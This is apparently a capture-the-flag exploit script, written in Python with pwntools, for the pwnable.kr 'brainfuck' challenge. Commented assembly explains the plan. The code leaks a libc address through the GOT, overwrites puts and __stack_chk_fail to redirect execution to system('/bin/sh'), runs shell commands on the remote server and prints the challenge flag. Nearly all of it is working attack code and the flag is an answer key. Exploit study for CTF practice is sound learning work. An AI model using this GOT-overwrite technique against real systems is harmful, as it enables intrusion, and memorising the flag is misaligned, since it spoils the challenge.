# Override puts to look at 08048700 (set up variables before calling memset)
# also override ___stack_chk_fail to look at system (both are in got table so we can override them by do_brainfuck function)
# now after doing it, we would call puts (with '[').
# What would happen is that it would call memset on an address which is before the real address of s string
# and then fgets (which we need to insert "/bin/sh") and then the normal brainfuck 'compiler' function.
# Now since esp is not alligned correctly
# when it would finish scanning s it would notice that stack canary has changed so it would call
# ___stack_chk_fail, but as you can tell we have overriden this to be system function.

# The main idea here is the following
# .text:08048768                 mov     [esp], eax        <----- (eax points to our new string which has "/bin/sh")
# .text:0804876B                 call    _strlen
# .text:08048770                 cmp     ebx, eax
# .text:08048772                 jb      short loc_8048743
# .text:08048774                 mov     eax, 0
# .text:08048779                 mov     edx, [esp+42Ch]
# .text:08048780                 xor     edx, large gs:14h
# .text:08048787                 jz      short loc_804878E
# .text:08048789                 call    ___stack_chk_fail <----- (notice that stack hasn't changed so the stack parameter is eax)

# We will get system address by reading puts address and because we have
# a libc we can know what is the difference between system and puts functions

from pwn import *


payload = b"<" * 32                 # Move p in order to point to it's own address
payload += b","                     # Override first byte of p
payload += b".>" * 4                # Print current value inside p (puts address)
payload += b"<,<,<,<,"              # Override puts to look at 08048700 in main
payload += b"<" * 4                 # Move p to point to ___stack_chk_fail in got table
payload += b",>" * 4                # Override ___stack_chk_fail to point to system
payload += b"[\n"                   # Call system(s)
payload += p8(0x18)
payload += p32(0x08048700)[::-1]

puts_got_plt_addr_last_byte = 0x18
main_memset_setup_call_addr = 0x08048700
puts_addr_libc              = 0x5fcb0
system_addr_libc            = 0x3adb0

r = remote("pwnable.kr", 9001)

r.sendafter(b"type some brainfuck instructions except [ ]\n", payload)

recv_data = r.recvn(4)

# Gets puts real address inside libc
puts_got_entry_addr_str = recv_data[:4]
puts_got_entry_addr     = int.from_bytes(puts_got_entry_addr_str, byteorder="little")

# Calculate address in loaded libc
libc_start_addr = puts_got_entry_addr - puts_addr_libc

system_addr     = libc_start_addr + system_addr_libc
system_addr_str = p32(system_addr)

r.send(system_addr_str)

# Now we are running in main and it expects for input from fgets
r.sendline(b"cd brainfuck_pwn; cat flag")
flag = r.recv().decode()[1:-1]

# After scanned through string ___stack_chk_fail (which is system supposed to be called)
r.close()

# Flag: bR41n_F4ck_Is_FuN_LanguaG3
print("flag is:", flag)